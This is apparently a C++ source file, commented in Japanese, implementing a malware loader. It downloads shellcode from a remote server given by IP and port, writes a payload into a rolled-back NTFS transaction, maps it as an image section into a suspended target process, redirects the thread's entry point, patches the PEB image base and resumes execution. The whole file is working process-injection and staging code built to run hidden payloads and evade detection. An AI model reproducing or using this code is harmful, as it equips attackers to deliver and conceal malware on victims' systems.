#include "TransactionHollowing.h"

void RedirectToPayload(PBYTE payload, LPVOID baseAddress, PROCESS_INFORMATION& pi) {
    // PEヘッダ取得
    PIMAGE_DOS_HEADER pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(payload);
    PIMAGE_NT_HEADERS pNtHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(payload + pDosHeader->e_lfanew);

    // エントリポイント取得
    DWORD entryPointOffset = pNtHeader->OptionalHeader.AddressOfEntryPoint;
    ULONGLONG entryPoint = reinterpret_cast<ULONGLONG>(baseAddress) + entryPointOffset;

    // 現在のスレッドコンテキストを取得
    CONTEXT context = {};
    context.ContextFlags = CONTEXT_ALL;
    GetThreadContext(pi.hThread, &context);

    // Rcxにエントリポイント
    context.Rcx = entryPoint;
    SetThreadContext(pi.hThread, &context);

    // イメージベースを書き換え
    ULONGLONG pebAddress = context.Rdx;
    LPVOID remoteImageBase = reinterpret_cast<LPVOID>(pebAddress + 0x10);
    WriteProcessMemory(pi.hProcess, remoteImageBase, &baseAddress, sizeof(ULONGLONG), nullptr);

    return;
}



void TransactionNTFSHollowing(std::wstring targetPath, PBYTE payload, DWORD payloadSize) {

    // tempパスを取得
    wchar_t tempPath[MAX_PATH] = {};
    DWORD size = GetTempPathW(MAX_PATH, tempPath);

    // 一時ファイル名を生成
    wchar_t dummyName[MAX_PATH] = {};
    GetTempFileNameW(tempPath, L"TH", 0, dummyName);

    // トランザクション付きファイル操作として、ペイロードファイルを作成
    HANDLE transactionHandle = CreateTransaction(nullptr, nullptr, 0, 0, 0, 0, nullptr);
    HANDLE TransactedHandle = CreateFileTransacted(dummyName, GENERIC_WRITE | GENERIC_READ, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr, transactionHandle, nullptr, nullptr);
    WriteFile(TransactedHandle, payload, payloadSize, nullptr, nullptr);

    // ファイルをセクションオブジェクトとしてメモリマッピングし、トランザクションをロールバック
    HANDLE hSection = nullptr;
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, 0, PAGE_READONLY, SEC_IMAGE, TransactedHandle);
    CloseHandle(TransactedHandle);
    RollbackTransaction(transactionHandle);
    CloseHandle(transactionHandle);

    // サスペンドモードでターゲットプロセスを作成
    PROCESS_INFORMATION pi = {};
    STARTUPINFOW si = {};
    CreateProcessInternalW(nullptr, nullptr, const_cast<LPWSTR>(targetPath.c_str()), nullptr, nullptr, FALSE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi, nullptr);
    HANDLE processHandle = pi.hProcess;

    // セクションオブジェクトのペイロードをターゲットプロセスにマッピング
    LPVOID sectionBaseAddress = 0;
    SIZE_T viewSize = 0;
    NtMapViewOfSection(hSection, processHandle, &sectionBaseAddress, 0, 0, 0, &viewSize, ViewShare, 0, PAGE_READONLY);

    // サスペンドプロセスのエントリポイント更新
    RedirectToPayload(payload, sectionBaseAddress, pi);

    // スレッド再開
    ResumeThread(pi.hThread);

    return;
}

// URLを構築する関数
std::wstring makeUrl(const Arg& arg) {
    return std::wstring(arg.protocol) + std::wstring(arg.ipAddress) + L":" + std::wstring(arg.port) + L"/" + std::wstring(arg.filePath);
}

// ファイルサーバーからペイロードをステージング
bool StagingPayload(const std::wstring& url, std::vector<BYTE>& shellcode) {

    // URLを開く
    HINTERNET internetHandle = InternetOpen(L"Shellcode Downloader", INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    HINTERNET urlHandle = InternetOpenUrl(internetHandle, url.c_str(), nullptr, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_CACHE_WRITE, 0);

    DWORD bytesRead;
    BYTE buffer[1024];

    // ペイロードを読み込むループ
    while (true) {
        if (!InternetReadFile(urlHandle, buffer, sizeof(buffer), &bytesRead) || bytesRead == 0) {
            break;
        }

        // 読み込んだデータをベクターに追加
        shellcode.insert(shellcode.end(), buffer, buffer + bytesRead);
    }

    return !shellcode.empty();
}